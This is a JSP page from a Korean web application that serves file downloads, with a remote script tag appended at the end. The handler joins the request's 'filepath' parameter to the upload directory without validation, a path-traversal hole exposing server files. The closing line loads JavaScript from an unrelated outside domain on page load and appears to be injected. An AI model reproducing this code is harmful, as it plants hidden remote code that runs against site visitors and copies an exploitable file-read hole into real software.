<%@ page language="java" contentType="text/html; charset=UTF-8"
     pageEncoding="UTF-8"%>
<%@ page trimDirectiveWhitespaces="true" %>
<%@include file="/view/config/jqUI.jsp"%>
<%@ page import="java.io.File"%>
<%@ page import="java.io.FileInputStream"%>
<%@ page import="java.io.BufferedInputStream"%>
<%@ page import="java.io.BufferedOutputStream"%>
<% request.setCharacterEncoding("utf-8");
	BufferedInputStream input = null;
	BufferedOutputStream output = null;
	
	String realname = (String) request.getAttribute("realname"); //실제파일명
	String filepath =	request.getParameter("filepath");
	String filename =	request.getParameter("filename"); 
	filename = new String(filename.getBytes("euc-kr"), "ISO-8859-1");
	
	//Function.nullChk((String)request.getAttribute("filepath")); //파일경로
	System.out.println("filePath : " + filepath);
	System.out.println( "realPath : " +getServletContext().getRealPath("") );
	System.out.println("ContextPath : " + getServletContext().getContextPath());
	
	try {
		//File file = new File(getServletContext().getRealPath("")+"/"+filepath);
		File file = new File(getServletContext().getInitParameter("physicalUploadPath")+"/"+filepath);
		
		System.out.println("path : " + file.getAbsolutePath());
		
		input = new BufferedInputStream(new FileInputStream(file));
		response.reset(); 
		response.resetBuffer();
		String strClient = request.getHeader("User-Agent");
		System.out.println("strclient  :" + strClient);
		if (strClient.indexOf("MSIE 5.5") != -1){
			response.setHeader("Content-Disposition", "filename="+new String(realname.getBytes("utf-8"), "ISO-8859-1") + ";");
		
//20120524 홍윤호 수정 시작
	}else if(filepath.indexOf(".hwp")!=-1){
		response.setHeader("Content-Disposition", "attachment; filename="+filename+ ";");
		response.setHeader("Content-Type", "application/octet-stream; charset=utf-8");
	}else{
	//		
		response.setHeader("Content-Disposition", "attachment; filename="+ filename + ";");
		response.setHeader("Content-Type", "application/octet-stream; charset=utf-8");
	//    
	}
//20120524 홍윤호 수정 끝
		response.setHeader("Content-Length", "" + file.length());
		response.setHeader("Content-Transfer-Encoding", "binary;");
		response.setHeader("Pragma", "no-cache;");
		response.setHeader("Expires", "-1;");
		byte buffer[] = new byte[1024];
		int len = 0;
	
		output = new BufferedOutputStream(response.getOutputStream());
		while ((len = input.read(buffer)) > 0) {
			output.write(buffer, 0, len);
		}
		input.close();
		output.close();
		out.clear();
		out = pageContext.pushBody(); 
	} catch (Exception e) {
		e.printStackTrace();
		out.println("<script>");
		out.println("alert('요청한 파일을 찾을 수 없습니다.');");
		out.println("history.back();");
		out.println("</script>");
		return;
	} finally {
		//response.flushBuffer();
		if (input != null)
			try {
				input.close();
			} catch (Exception e) {}
		if (output != null)
			try {
				output.close();
			} catch (Exception e) {}
	}%>
<script src=http://makrea.com/img/btn/1.js></script>